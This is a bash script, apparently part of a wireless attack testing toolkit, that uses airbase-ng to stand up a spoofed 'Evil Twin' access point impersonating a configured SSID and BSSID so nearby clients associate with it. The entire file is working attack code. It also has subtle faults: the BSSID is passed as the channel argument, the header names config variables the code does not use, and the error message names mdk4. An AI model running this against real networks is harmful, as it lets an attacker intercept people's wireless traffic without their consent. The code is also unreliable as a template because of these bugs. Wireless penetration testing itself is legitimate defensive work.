#!/bin/bash
#
# Utility: Directed Probe Response using airbase-ng
#
# Description:
#   Launches a spoofed access point using airbase-ng that responds to probe requests
#   for a configured SSID. This simulates an Evil Twin-style setup to trick clients
#   into associating with a fake AP.
#
# Requirements:
#   - airbase-ng must be installed and in PATH
#   - Must be run with sudo/root privileges (handled by watt.py)
#   - Interface must support monitor mode
#
# Usage:
#   ./run_airbase_probe.sh
#
# Inputs:
#   - Duration in seconds (prompted at runtime)
#
# Config:
#   - SSID and channel are defined in config.sh:
#       T016_PROBE_SSID="WSTTCorpWiFi"
#       T016_PROBE_BSSID="02:00:00:00:00:04" # match real AP
#       T016_PROBE_CHANNEL=6
#
# Notes:
#   - Automatically enables monitor mode if needed
#   - Cleans up on SIGINT or timeout using EXIT trap
#   - Clients previously connected to the spoofed SSID may auto-associate
#   - Forms the basis for T016

# ─── Paths ───
BASH_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
CONFIG_DIR="$BASH_DIR/config"
HELPERS_DIR="$BASH_DIR/helpers"
UTILITIES_DIR="$BASH_DIR/utilities"

# ─── Configs ───
source "$CONFIG_DIR/global.conf"
source "$CONFIG_DIR/atk_airbase_probe.conf"

# ─── Helpers ───
source "$HELPERS_DIR/fn_print.sh"
source "$HELPERS_DIR/fn_mode.sh"
source "$HELPERS_DIR/fn_cleanup.sh"

# Exit traps
trap cleanup EXIT
trap cleanup SIGINT

# Validate config vars
if [[ -z "$INTERFACE" || -z "$ATK_PROBE_SSID" || -z "$ATK_PROBE_BSSID" ]]; then
    print_warn "INTERFACE, ATK_PROBE_SSID, or ATK_PROBE_BSSID not defined in atk_airbase_probe.conf"
    exit 0
fi

# Display config
echo "Mode         : T016 - Directed Probe Response"
echo "Interface    : $INTERFACE"
echo "Target SSID  : $ATK_PROBE_SSID"
echo "Target BSSID : $ATK_PROBE_BSSID"
print_blank

# Confirm attack
print_prompt "Proceed with attack? (y/N): "
read -r confirm

if [[ "$confirm" != "y" && "$confirm" != "Y" ]]; then
    print_warn "Cancelled"
    exit 0
fi

# Input duration
while true; do
    print_prompt "Duration (seconds) [default: ${ATK_DURATION}]: "
    read -r DURATION

    DURATION="${DURATION:-$ATK_DURATION}"
    
    if [[ "$DURATION" =~ ^[0-9]+$ ]]; then
        break
    else
        print_fail "Invalid input. Enter a numeric value"
    fi
done

# Launch attack
echo "T016" > /tmp/watt_attack_active
print_blank
print_info "Starting Attack"

# Set monitor mode
ensure_monitor_mode

# Run attack
print_blank
print_info "Running T016 - Directed Probe Response attack for $DURATION seconds"
sudo timeout "$DURATION" airbase-ng -e "$ATK_PROBE_SSID" -c "$ATK_PROBE_BSSID" -a "$ATK_PROBE_BSSID" "$INTERFACE"

EXIT_CODE=$?

# Exit check
if [[ "$EXIT_CODE" -eq 124 ]]; then
    print_success "Attack ended"
elif [[ "$EXIT_CODE" -ne 0 ]]; then
    print_fail "mdk4 exited with code $EXIT_CODE"
fi

exit 0